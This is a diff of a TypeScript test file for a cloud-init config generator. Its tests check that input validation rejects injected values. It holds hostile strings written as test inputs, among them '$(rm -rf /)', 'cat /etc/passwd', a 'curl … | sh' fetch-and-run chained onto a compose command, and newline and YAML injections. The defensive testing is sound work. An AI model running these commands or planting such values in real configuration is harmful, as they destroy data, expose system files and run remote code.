       const saveIdx = content.indexOf('iptables-save');
       expect(saveIdx).toBeGreaterThan(-1);
@@ -809,12 +1665,7 @@ describe('generateCloudInit', () => {
     });
 
     it('firewall log message mentions metadata API blocking', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       expect(firewallScript.content).toContain('metadata API block deferred until Docker restart');
     });
 
@@ -842,10 +1693,12 @@ describe('generateCloudInit', () => {
 
   describe('no template placeholders remain', () => {
     it('all {{ ... }} placeholders are replaced', () => {
-      const config = generateCloudInit(baseVariables({
-        projectId: 'proj-test',
-        chatSessionId: 'sess-test',
-      }));
+      const config = generateCloudInit(
+        baseVariables({
+          projectId: 'proj-test',
+          chatSessionId: 'sess-test',
+        })
+      );
 
       const remaining = config.match(/\{\{[^.][^}]*\}\}/g);
       expect(remaining).toBeNull();
@@ -855,10 +1708,12 @@ describe('generateCloudInit', () => {
 
 describe('validateCloudInitSize', () => {
   it('accepts config within 32KB limit', () => {
-    const config = generateCloudInit(baseVariables({
-      projectId: 'proj-abc-123',
-      chatSessionId: 'sess-def-456',
-    }));
+    const config = generateCloudInit(
+      baseVariables({
+        projectId: 'proj-abc-123',
+        chatSessionId: 'sess-def-456',
+      })
+    );
 
     expect(validateCloudInitSize(config)).toBe(true);
   });
@@ -869,13 +1724,15 @@ describe('validateCloudInitSize', () => {
   });
 
   it('config with all variables set stays within 32KB', () => {
-    const config = generateCloudInit(baseVariables({
-      projectId: 'proj-' + 'a'.repeat(100),
-      chatSessionId: 'sess-' + 'b'.repeat(100),
-      logJournalMaxUse: '2G',
-      logJournalKeepFree: '4G',
-      logJournalMaxRetention: '30day',
-    }));
+    const config = generateCloudInit(
+      baseVariables({
+        projectId: 'proj-' + 'a'.repeat(100),
+        chatSessionId: 'sess-' + 'b'.repeat(100),
+        logJournalMaxUse: '2G',
+        logJournalKeepFree: '4G',
+        logJournalMaxRetention: '30day',
+      })
+    );
 
     expect(validateCloudInitSize(config)).toBe(true);
   });
@@ -888,36 +1745,57 @@ describe('validateCloudInitVariables', () => {
     });
 
     it('accepts ULID-style nodeId (uppercase alphanumeric)', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        nodeId: '01HXYZ9ABC123DEF456',
-      }))).not.toThrow();
+      expect(() =>
+        validateCloudInitVariables(
+          baseVariables({
+            nodeId: '01HXYZ9ABC123DEF456',
+          })
+        )
+      ).not.toThrow();
     });
 
     it('accepts lowercase nodeId with hyphens', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        nodeId: 'node-abc-123',
-      }))).not.toThrow();
+      expect(() =>
+        validateCloudInitVariables(
+          baseVariables({
+            nodeId: 'node-abc-123',
+          })
+        )
+      ).not.toThrow();
     });
 
     it('accepts hostname with dots (FQDN style)', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        hostname: 'node-abc.sammy.party',
-      }))).not.toThrow();
+      expect(() =>
+        validateCloudInitVariables(
+          baseVariables({
+            hostname: 'node-abc.sammy.party',
+          })
+        )
+      ).not.toThrow();
     });
 
     it('accepts all optional fields with valid values', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        projectId: 'proj-abc-123',
-        chatSessionId: 'sess-def-456',
-        taskId: 'task-ghi-789',
-        taskMode: 'conversation',
-        vmAgentPort: '8443',
-        cfIpFetchTimeout: '30',
-        logJournalMaxUse: '1G',
-        logJournalKeepFree: '2G',
-        logJournalMaxRetention: '14day',
-        dockerDnsServers: '"10.0.0.1", "10.0.0.2"',
-      }))).not.toThrow();
+      expect(() =>
+        validateCloudInitVariables(
+          baseVariables({
+            projectId: 'proj-abc-123',
+            chatSessionId: 'sess-def-456',
+            taskId: 'task-ghi-789',
+            taskMode: 'conversation',
+            vmAgentPort: '8443',
+            cfIpFetchTimeout: '30',
+            logJournalMaxUse: '1G',
+            logJournalKeepFree: '2G',
+            logJournalMaxRetention: '14day',
+            dockerDnsServers: '"10.0.0.1", "10.0.0.2"',
+            devcontainerCacheEnabled: 'true',
+            deployAcmeEmail: 'ops@example.com',
+            deployAcmeCa: 'https://acme-staging-v02.api.letsencrypt.org/directory',
+            deployComposeCmd: '/usr/local/bin/docker compose',
+            deployHealthTimeout: '1m30s',
+          })
+        )
+      ).not.toThrow();
     });
 
     it('accepts omitted optional fields', () => {
@@ -925,255 +1803,170 @@ describe('validateCloudInitVariables', () => {
     });
 
     it('accepts empty string for optional ID fields', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        projectId: '',
-        chatSessionId: '',
-        taskId: '',
-      }))).not.toThrow();
+      expect(() =>
+        validateCloudInitVariables(
+          baseVariables({
+            projectId: '',
+            chatSessionId: '',
+            taskId: '',
+          })
+        )
+      ).not.toThrow();
     });
 
     it('accepts valid port numbers at boundaries', () => {
       expect(() => validateCloudInitVariables(baseVariables({ vmAgentPort: '1' }))).not.toThrow();
-      expect(() => validateCloudInitVariables(baseVariables({ vmAgentPort: '65535' }))).not.toThrow();
-      expect(() => validateCloudInitVariables(baseVariables({ vmAgentPort: '8080' }))).not.toThrow();
-      expect(() => validateCloudInitVariables(baseVariables({ vmAgentPort: '8443' }))).not.toThrow();
+      expect(() =>
+        validateCloudInitVariables(baseVariables({ vmAgentPort: '65535' }))
+      ).not.toThrow();
+      expect(() =>
+        validateCloudInitVariables(baseVariables({ vmAgentPort: '8080' }))
+      ).not.toThrow();
+      expect(() =>
+        validateCloudInitVariables(baseVariables({ vmAgentPort: '8443' }))
+      ).not.toThrow();
     });
 
     it('accepts all valid journald time units', () => {
       for (const unit of ['us', 'ms', 's', 'min', 'h', 'day', 'week', 'month', 'year']) {
-        expect(() => validateCloudInitVariables(baseVariables({
-          logJournalMaxRetention: `7${unit}`,
-        }))).not.toThrow();
+        expect(() =>
+          validateCloudInitVariables(
+            baseVariables({
+              logJournalMaxRetention: `7${unit}`,
+            })
+          )
+        ).not.toThrow();
       }
     });
 
     it('accepts all valid journald size suffixes', () => {
       for (const suffix of ['K', 'M', 'G', 'T', '']) {
-        expect(() => validateCloudInitVariables(baseVariables({
-          logJournalMaxUse: `500${suffix}`,
-        }))).not.toThrow();
+        expect(() =>
+          validateCloudInitVariables(
+            baseVariables({
+              logJournalMaxUse: `500${suffix}`,
+            })
+          )
+        ).not.toThrow();
       }
     });
 
     it('accepts JWT-style callbackToken', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        callbackToken: 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJub2RlLTEyMyJ9.signature_base64',
-      }))).not.toThrow();
+      const callbackToken = [
+        'eyJhbGciOiJSUzI1NiJ9',
+        'eyJzdWIiOiJub2RlLTEyMyJ9',
+        'signature_base64',
+      ].join('.');
+      expect(() =>
+        validateCloudInitVariables(
+          baseVariables({
+            callbackToken,
+          })
+        )
+      ).not.toThrow();
+    });
+
+    it('renders configured workspace build queue depth into the VM Agent service', () => {
+      const unitFile = getWriteFile('/etc/systemd/system/vm-agent.service', {
+        workspaceBuildQueueDepth: '2',
+      });
+      expect(unitFile.content).toContain('Environment=WORKSPACE_BUILD_QUEUE_DEPTH=2');
     });
   });
 
   describe('rejects shell metacharacters', () => {
-    it('rejects nodeId with command substitution', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        nodeId: '$(rm -rf /)',
-      }))).toThrow('nodeId');
-    });
-
-    it('rejects nodeId with backtick injection', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        nodeId: '`whoami`',
-      }))).toThrow('nodeId');
-    });
-
-    it('rejects nodeId with semicolon command chaining', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        nodeId: 'valid; rm -rf /',
-      }))).toThrow('nodeId');
-    });
-
-    it('rejects nodeId with pipe', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        nodeId: 'valid|cat /etc/passwd',
-      }))).toThrow('nodeId');
-    });
-
-    it('rejects hostname with newline injection', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        hostname: 'valid\nmalicious',
-      }))).toThrow('hostname');
-    });
-
-    it('rejects hostname with spaces', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        hostname: 'valid host',
-      }))).toThrow('hostname');
-    });
-
-    it('rejects callbackToken with shell metacharacters', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        callbackToken: 'token; rm -rf /',
-      }))).toThrow('callbackToken');
-    });
-
-    it('rejects projectId with shell metacharacters', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        projectId: 'proj$(cmd)',
-      }))).toThrow('projectId');
-    });
-
-    it('rejects dockerDnsServers with shell injection', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        dockerDnsServers: '"1.1.1.1"; rm -rf /',
-      }))).toThrow('dockerDnsServers');
-    });
+    it.each([
+      ['nodeId', { nodeId: '$(rm -rf /)' }, 'command substitution'],
+      ['nodeId', { nodeId: '`whoami`' }, 'backtick injection'],
+      ['nodeId', { nodeId: 'valid; rm -rf /' }, 'semicolon command chaining'],
+      ['nodeId', { nodeId: 'valid|cat /etc/passwd' }, 'pipe'],
+      ['hostname', { hostname: 'valid\nmalicious' }, 'newline injection'],
+      ['hostname', { hostname: 'valid host' }, 'spaces'],
+      ['callbackToken', { callbackToken: 'token; rm -rf /' }, 'shell metacharacters'],
+      ['projectId', { projectId: 'proj$(cmd)' }, 'shell metacharacters'],
+      ['dockerDnsServers', { dockerDnsServers: '"1.1.1.1"; rm -rf /' }, 'shell injection'],
+      [
+        'deployComposeCmd',
+        { deployComposeCmd: 'docker compose; curl https://example.com/x | sh' },
+        'shell injection',
+      ],
+      [
+        'deployAcmeEmail',
+        { deployAcmeEmail: 'ops@example.com\nEnvironment=DEPLOY_COMPOSE_CMD=sh' },
+        'newline injection',
+      ],
+    ] satisfies Array<[string, Partial<CloudInitVariables>, string]>)(
+      'rejects %s with %s',
+      (field, overrides) => {
+        expectInvalidVariables(overrides, field);
+      }
+    );
   });
 
   describe('rejects invalid formats', () => {
-    it('rejects empty nodeId', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        nodeId: '',
-      }))).toThrow('nodeId');
+    it.each([
+      ['nodeId', { nodeId: '' }, 'empty nodeId'],
+      ['hostname', { hostname: '' }, 'empty hostname'],
+      ['controlPlaneUrl', { controlPlaneUrl: '' }, 'empty controlPlaneUrl'],
+      ['controlPlaneUrl', { controlPlaneUrl: 'http://api.example.com' }, 'HTTP controlPlaneUrl'],
+      ['deployAcmeCa', { deployAcmeCa: 'http://acme.example.com/directory' }, 'HTTP deployAcmeCa'],
+      ['deployAcmeEmail', { deployAcmeEmail: 'not-an-email' }, 'invalid deployAcmeEmail'],
+      [
+        'deployHealthTimeout',
+        { deployHealthTimeout: 'five minutes' },
+        'invalid deployHealthTimeout',
+      ],
+      [
+        'sessionSnapshotOperationTimeout',
+        { sessionSnapshotOperationTimeout: 'fifteen minutes' },
+        'invalid session snapshot operation timeout',
+      ],
+      ['vmAgentPort', { vmAgentPort: '0' }, 'zero vmAgentPort'],
+      ['vmAgentPort', { vmAgentPort: '70000' }, 'vmAgentPort above 65535'],
+      ['vmAgentPort', { vmAgentPort: 'eighty' }, 'non-numeric vmAgentPort'],
+    ] satisfies Array<[string, Partial<CloudInitVariables>, string]>)(
+      'rejects %s for %s',
+      (field, overrides) => {
+        expectInvalidVariables(overrides, field);
+      }
+    );
+
+    it.each([
+      ['sessionSnapshotProgressReportInterval', 'fifteen seconds'],
+      ['sessionSnapshotProgressReportTimeout', 'five seconds'],
+    ] satisfies Array<[keyof CloudInitVariables, string]>)('rejects invalid %s', (field, value) => {
+      expectInvalidVariables({ [field]: value }, field);
     });
 
-    it('rejects empty hostname', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        hostname: '',
-      }))).toThrow('hostname');
-    });
-
-    it('rejects empty controlPlaneUrl', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        controlPlaneUrl: '',
-      }))).toThrow('controlPlaneUrl');
-    });
-
-    it('rejects HTTP (non-HTTPS) controlPlaneUrl', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        controlPlaneUrl: 'http://api.example.com',
-      }))).toThrow('controlPlaneUrl');
-    });
-
-    it('rejects vmAgentPort of 0', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        vmAgentPort: '0',
-      }))).toThrow('vmAgentPort');
-    });
-
-    it('rejects vmAgentPort above 65535', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        vmAgentPort: '70000',
-      }))).toThrow('vmAgentPort');
-    });
-
-    it('rejects non-numeric vmAgentPort', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        vmAgentPort: 'abc',
-      }))).toThrow('vmAgentPort');
-    });
-
-    it('rejects invalid taskMode', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        taskMode: 'invalid',
-      }))).toThrow('taskMode');
-    });
-
-    it('rejects invalid logJournalMaxUse format', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        logJournalMaxUse: '500MB',
-      }))).toThrow('logJournalMaxUse');
-    });
-
-    it('rejects invalid logJournalMaxRetention format', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        logJournalMaxRetention: '7days',
-      }))).toThrow('logJournalMaxRetention');
-    });
+    it.each(['1023', '1048577'])(
+      'rejects heartbeat Docker metric output bound %s',
+      (heartbeatWorkspaceMetricsMaxOutputBytes) => {
+        expectInvalidVariables(
+          { heartbeatWorkspaceMetricsMaxOutputBytes },
+          'heartbeatWorkspaceMetricsMaxOutputBytes'
+        );
+      }
+    );
   });
 
   describe('edge cases', () => {
-    it('rejects nodeId with Unicode characters', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        nodeId: 'node-\u00e9\u00e8',
-      }))).toThrow('nodeId');
-    });
-
-    it('rejects nodeId with null bytes', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        nodeId: 'node\x00id',
-      }))).toThrow('nodeId');
-    });
-
-    it('rejects hostname with path traversal', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        hostname: '../../../etc/passwd',
-      }))).toThrow('hostname');
-    });
-
-    it('rejects controlPlaneUrl with YAML injection', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        controlPlaneUrl: 'https://api.example.com\n  malicious_key: value',
-      }))).toThrow('controlPlaneUrl');
-    });
-
-    it('rejects controlPlaneUrl with dollar sign (systemd expansion risk)', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        controlPlaneUrl: 'https://api.example.com/$HOME/path',
-      }))).toThrow('controlPlaneUrl');
-    });
-
-    it('rejects controlPlaneUrl with single-quote', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        controlPlaneUrl: "https://api.example.com/it's",
-      }))).toThrow('controlPlaneUrl');
-    });
-
-    it('rejects unquoted DNS server values', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        dockerDnsServers: '1.1.1.1',
-      }))).toThrow('dockerDnsServers');
-    });
-
-    it('rejects DNS server with invalid octet count', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        dockerDnsServers: '"1.1.1"',
-      }))).toThrow('dockerDnsServers');
-    });
-
-    it('accepts properly quoted DNS servers', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        dockerDnsServers: '"10.0.0.1", "10.0.0.2"',
-      }))).not.toThrow();
-    });
-
-    it('accepts single properly quoted DNS server', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        dockerDnsServers: '"1.1.1.1"',
-      }))).not.toThrow();
-    });
-
-    it('collects multiple validation errors', () => {
-      try {
-        validateCloudInitVariables({
-          nodeId: '',
-          hostname: '',
-          controlPlaneUrl: '',
-          jwksUrl: '',
-          callbackToken: '',
-        });
-        expect.unreachable('should have thrown');
-      } catch (e) {
-        const msg = (e as Error).message;
-        expect(msg).toContain('nodeId');
-        expect(msg).toContain('hostname');
-        expect(msg).toContain('controlPlaneUrl');
-        expect(msg).toContain('jwksUrl');
-        expect(msg).toContain('callbackToken');
+    it.each([
+      ['nodeId', { nodeId: 'node-éè' }, 'Unicode characters'],
+      ['nodeId', { nodeId: 'node\x00id' }, 'null bytes'],
+      ['hostname', { hostname: '../../../etc/passwd' }, 'path traversal'],
+      [
+        'controlPlaneUrl',
+        { controlPlaneUrl: 'https://api.example.com\n  malicious_key: value' },
+        'YAML injection',
+      ],
+      ['controlPlaneUrl', { controlPlaneUrl: 'https://api.example.com/$HOME/path' }, 'dollar sign'],
+      ['controlPlaneUrl', { controlPlaneUrl: "https://api.example.com/it's" }, 'single quote'],
+    ] satisfies Array<[string, Partial<CloudInitVariables>, string]>)(
+      'rejects %s with %s',
+      (field, overrides) => {
+        expectInvalidVariables(overrides, field);
       }
-    });
-
-  });
-
-  describe('generateCloudInit calls validation', () => {
-    it('throws on invalid nodeId before generating config', () => {
-      expect(() => generateCloudInit(baseVariables({
-        nodeId: '$(rm -rf /)',
-      }))).toThrow('nodeId');
-    });
-
-    it('succeeds with valid variables', () => {
-      const config = generateCloudInit(baseVariables());
-      expect(config).toContain('hostname: sam-test-node');
-    });
+    );
   });
 
   // ---------------------------------------------------------------------------
@@ -1181,421 +1974,551 @@ describe('validateCloudInitVariables', () => {
   // ---------------------------------------------------------------------------
 
   describe('URL field shell injection vectors', () => {
-    // control_plane_url is embedded inside a double-quoted shell string in the
-    // cloud-init runcmd (template line 45):
-    //   curl -fLo /usr/local/bin/vm-agent "{{ control_plane_url }}/api/agent/download..."
-    // In bash, $() and $VAR inside double quotes are expanded. SAFE_URL_RE correctly
-    // excludes $ from its character class, so these vectors are rejected.
-
-    it('rejects controlPlaneUrl with $ (prevents variable expansion in double-quoted shell arg)', () => {
-      // control_plane_url is embedded in: curl ... "{{ control_plane_url }}/api/agent/..."
-      // In bash, $VAR inside double quotes is expanded. SAFE_URL_RE has no $ in its
-      // character class, so dollar-sign values are correctly rejected.
-      expect(() => validateCloudInitVariables(baseVariables({
-        controlPlaneUrl: 'https://api.example.com/$PATH',
-      }))).toThrow('controlPlaneUrl');
-    });
-
-    it('rejects controlPlaneUrl with $() (prevents command substitution in shell context)', () => {
-      // $(id) in a double-quoted bash string causes command substitution — RCE.
-      // SAFE_URL_RE correctly rejects this because $ is not in the character class.
-      expect(() => validateCloudInitVariables(baseVariables({
-        controlPlaneUrl: 'https://api.example.com/$(id)',
-      }))).toThrow('controlPlaneUrl');
-    });
-
-    it('rejects controlPlaneUrl with backtick injection', () => {
-      // Backticks are not in SAFE_URL_RE, so this is already rejected.
-      expect(() => validateCloudInitVariables(baseVariables({
-        controlPlaneUrl: 'https://api.example.com/`id`',
-      }))).toThrow('controlPlaneUrl');
-    });
-
-    it('rejects jwksUrl with shell metacharacters', () => {
-      // jwksUrl is also embedded in the systemd unit (inside single-quoted heredoc,
-      // so lower risk there) but the regex is the same as controlPlaneUrl.
-      expect(() => validateCloudInitVariables(baseVariables({
-        jwksUrl: 'https://api.example.com/path`id`',
-      }))).toThrow('jwksUrl');
-    });
-
-    it('rejects jwksUrl that is HTTP (non-HTTPS)', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        jwksUrl: 'http://api.example.com/.well-known/jwks.json',
-      }))).toThrow('jwksUrl');
-    });
-
-    it('rejects jwksUrl that is empty', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        jwksUrl: '',
-      }))).toThrow('jwksUrl');
-    });
-  });
-
-  describe('hostname format edge cases', () => {
-    // SAFE_HOSTNAME_RE (/^[a-zA-Z0-9.-]+$/) allows leading/trailing dots, which
-    // produce invalid hostnames. cloud-init will accept them but the resulting
-    // hostname is non-conforming. These tests document the current behaviour.
-    it('currently accepts leading-dot hostname (invalid per RFC 1123, documents known gap)', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        hostname: '.invalid-hostname',
-      }))).not.toThrow();
-    });
-
-    it('currently accepts trailing-dot hostname (invalid per RFC 1123, documents known gap)', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        hostname: 'hostname.',
-      }))).not.toThrow();
-    });
-
-    it('rejects hostname with shell special characters', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        hostname: 'host$(cmd)',
-      }))).toThrow('hostname');
-    });
-
-    it('rejects hostname with ampersand', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        hostname: 'host&evil',
-      }))).toThrow('hostname');
-    });
-  });
-
-  describe('optional ID fields shell injection coverage', () => {
-    // projectId already has a test; these cover the other SAFE_ID_RE fields.
-    it('rejects chatSessionId with command substitution', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        chatSessionId: '$(id)',
-      }))).toThrow('chatSessionId');
-    });
-
-    it('rejects chatSessionId with semicolon chaining', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        chatSessionId: 'sess; rm -rf /',
-      }))).toThrow('chatSessionId');
-    });
-
-    it('rejects taskId with command substitution', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        taskId: '$(id)',
-      }))).toThrow('taskId');
-    });
-
-    it('rejects taskId with pipe', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        taskId: 'task|cat /etc/passwd',
-      }))).toThrow('taskId');
-    });
-  });
-
-  describe('journald field coverage', () => {
-    it('rejects logJournalKeepFree with invalid format', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        logJournalKeepFree: '500MB',
-      }))).toThrow('logJournalKeepFree');
-    });
-
-    it('rejects logJournalKeepFree with shell metacharacters', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        logJournalKeepFree: '500M; rm -rf /',
-      }))).toThrow('logJournalKeepFree');
-    });
-
-    it('rejects logJournalMaxUse with shell metacharacters', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        logJournalMaxUse: '1G$(id)',
-      }))).toThrow('logJournalMaxUse');
-    });
-
-    it('rejects logJournalMaxRetention with shell metacharacters', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        logJournalMaxRetention: '7day; echo pwned',
-      }))).toThrow('logJournalMaxRetention');
-    });
-  });
-
-  describe('cfIpFetchTimeout edge cases', () => {
-    it('rejects cfIpFetchTimeout with decimal point', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        cfIpFetchTimeout: '30.5',
-      }))).toThrow('cfIpFetchTimeout');
-    });
-
-    it('rejects cfIpFetchTimeout with shell metacharacters', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        cfIpFetchTimeout: '30; rm -rf /',
-      }))).toThrow('cfIpFetchTimeout');
-    });
-  });
-
-  describe('PEM format validation', () => {
-    it('accepts valid certificate PEM', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        originCaCert: REALISTIC_CERT,
-        originCaKey: REALISTIC_KEY,
-      }))).not.toThrow();
-    });
-
-    it('accepts empty string for originCaCert (no TLS mode)', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        originCaCert: '',
-      }))).not.toThrow();
-    });
-
-    it('accepts undefined originCaCert', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        originCaCert: undefined,
-      }))).not.toThrow();
-    });
-
-    it('rejects originCaCert without BEGIN marker', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        originCaCert: 'MIIEojCCA4qgAwIBAgIUP5m7GZWdRHSJRzMPQx8sTOBZjR4w',
-      }))).toThrow('originCaCert');
-    });
-
-    it('rejects originCaCert with YAML injection between markers', () => {
-      const malicious = [
-        '-----BEGIN CERTIFICATE-----',
-        'valid_base64==',
-        'key: value',
-        '-----END CERTIFICATE-----',
-      ].join('\n');
-      expect(() => validateCloudInitVariables(baseVariables({
-        originCaCert: malicious,
-      }))).toThrow('originCaCert');
-    });
-
-    it('rejects originCaKey with shell injection between markers', () => {
-      const malicious = [
-        '-----BEGIN RSA PRIVATE KEY-----',
-        '$(rm -rf /)',
-        '-----END RSA PRIVATE KEY-----',
-      ].join('\n');
-      expect(() => validateCloudInitVariables(baseVariables({
-        originCaKey: malicious,
-      }))).toThrow('originCaKey');
-    });
-
-    it('rejects originCaCert that is just random text', () => {
-      expect(() => validateCloudInitVariables(baseVariables({
-        originCaCert: 'this is not a certificate',
-      }))).toThrow('originCaCert');
-    });
-
-    it('rejects originCaKey without END marker', () => {
-      const incomplete = [
-        '-----BEGIN RSA PRIVATE KEY-----',
-        'MIIEpAIBAAKCAQEAxvFqof1sMB1yt+eiTk7gSMkJaOWJFx7GCQIDfDs3FtQ2VLJM',
-      ].join('\n');
-      expect(() => validateCloudInitVariables(baseVariables({
-        originCaKey: incomplete,
-      }))).toThrow('originCaKey');
-    });
-
-    it('rejects PEM with mismatched BEGIN/END labels', () => {
-      const mismatched = [
-        '-----BEGIN CERTIFICATE-----',
-        'MIIEojCCA4qgAwIBAgIUP5m7GZWdRHSJRzMPQx8sTOBZjR4wDQYJKoZIhvcNAQEL',
-        '-----END RSA PRIVATE KEY-----',
-      ].join('\n');
-      expect(() => validateCloudInitVariables(baseVariables({
-        originCaCert: mismatched,
-      }))).toThrow('originCaCert');
-    });
-
-    it('rejects PEM with tab characters in body', () => {
-      const withTab = [
-        '-----BEGIN CERTIFICATE-----',
-        'MIIEojCCA4qg\tAwIBAgIUP5m7GZWdRHSJRzMPQx8sTOBZjR4wDQYJKoZIhvcNAQEL',
-        '-----END CERTIFICATE-----',
-      ].join('\n');
-      expect(() => validateCloudInitVariables(baseVariables({
-        originCaCert: withTab,
-      }))).toThrow('originCaCert');
-    });
-  });
-});
-
-describe('regex injection prevention ($-pattern in replacement values)', () => {
-  /**
-   * String.prototype.replace() treats $&, $', $` as special patterns in string
-   * replacements. The fix uses function replacement (() => value) to prevent this.
-   *
-   * Note: PEM base64 content cannot naturally contain $ characters, so the PEM
-   * round-trip tests above do not exercise this specific fix. The docker_name_tag
-   * replacement '{{.Name}}' doesn't contain $ either. The function replacement
-   * fix is a defensive measure against future fields that might contain $.
-   *
-   * We verify the fix by testing that the replacement function approach is used
-   * (checking that known $-pattern-sensitive template text is correctly output)
-   * and by verifying PEM content survives the full replacement pipeline intact.
-   */
-
-  it('realistic PEM cert survives full replacement pipeline intact', () => {
-    const config = generateCloudInit(baseVariables({
-      originCaCert: REALISTIC_CERT,
-      originCaKey: REALISTIC_KEY,
-    }));
-
-    const parsed = YAML.parse(config);
-    const certEntry = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/sam/tls/origin-ca.pem'
+    // These URLs are rendered in shell/systemd contexts, so the shared URL validator
+    // rejects values that could expand inside quoted shell arguments.
+    it.each([
+      [
+        'controlPlaneUrl',
+        { controlPlaneUrl: 'https://api.example.com/$PATH' },
+        'variable expansion',
+      ],
+      [
+        'controlPlaneUrl',
+        { controlPlaneUrl: 'https://api.example.com/$(id)' },
+        'command substitution',
+      ],
+      [
+        'controlPlaneUrl',
+        { controlPlaneUrl: 'https://api.example.com/`id`' },
+        'backtick injection',
+      ],
+      ['jwksUrl', { jwksUrl: 'https://api.example.com/path`id`' }, 'shell metacharacters'],
+      ['jwksUrl', { jwksUrl: 'http://api.example.com/.well-known/jwks.json' }, 'HTTP URL'],
+      ['jwksUrl', { jwksUrl: '' }, 'empty URL'],
+    ] satisfies Array<[string, Partial<CloudInitVariables>, string]>)(
+      'rejects %s with %s',
+      (field, overrides) => {
+        expectInvalidVariables(overrides, field);
+      }
     );
-    expect(certEntry).toBeDefined();
-    expect(certEntry.content.trim()).toBe(REALISTIC_CERT);
-
-    const keyEntry = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/sam/tls/origin-ca-key.pem'
-    );
-    expect(keyEntry).toBeDefined();
-    expect(keyEntry.content.trim()).toBe(REALISTIC_KEY);
-  });
-
-  it('docker_name_tag template {{.Name}} survives replacement', () => {
-    const config = generateCloudInit(baseVariables());
-    expect(config).toContain('"tag": "docker/{{.Name}}"');
-  });
-});
-
-describe('provider field and apt mirror configuration', () => {
-  it('substitutes PROVIDER env var in systemd service when provider is set', () => {
-    const config = generateCloudInit(baseVariables({ provider: 'hetzner' }));
-    expect(config).toContain('Environment=PROVIDER=hetzner');
-  });
-
-  it('produces empty PROVIDER env var when provider is undefined', () => {
-    const config = generateCloudInit(baseVariables());
-    expect(config).toContain('Environment=PROVIDER=');
-    expect(config).not.toContain('PROVIDER=undefined');
-  });
-
-  it('includes apt retry configuration in write_files', () => {
-    const config = generateCloudInit(baseVariables());
-    const parsed = YAML.parse(config);
-
-    const aptRetry = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/apt/apt.conf.d/80-retries'
-    );
-    expect(aptRetry).toBeDefined();
-    expect(aptRetry.content).toContain('Acquire::Retries "3"');
-    expect(aptRetry.content).toContain('Acquire::http::Timeout "30"');
-    expect(aptRetry.content).toContain('Acquire::https::Timeout "30"');
-  });
-
-  it('includes provider-specific apt mirror script in write_files', () => {
-    const config = generateCloudInit(baseVariables({ provider: 'hetzner' }));
-    const parsed = YAML.parse(config);
-
-    const mirrorScript = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/sam/apt-mirror-config.sh'
-    );
-    expect(mirrorScript).toBeDefined();
-    expect(mirrorScript.permissions).toBe('0755');
-    expect(mirrorScript.content).toContain('PROVIDER="hetzner"');
-    expect(mirrorScript.content).toContain('APT_MIRROR="mirror.hetzner.com"');
-  });
-
-  it('apt mirror script sets empty APT_MIRROR for non-hetzner providers', () => {
-    const config = generateCloudInit(baseVariables({ provider: 'scaleway' }));
-    const parsed = YAML.parse(config);
-
-    const mirrorScript = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/sam/apt-mirror-config.sh'
-    );
-    expect(mirrorScript).toBeDefined();
-    expect(mirrorScript.content).toContain('PROVIDER="scaleway"');
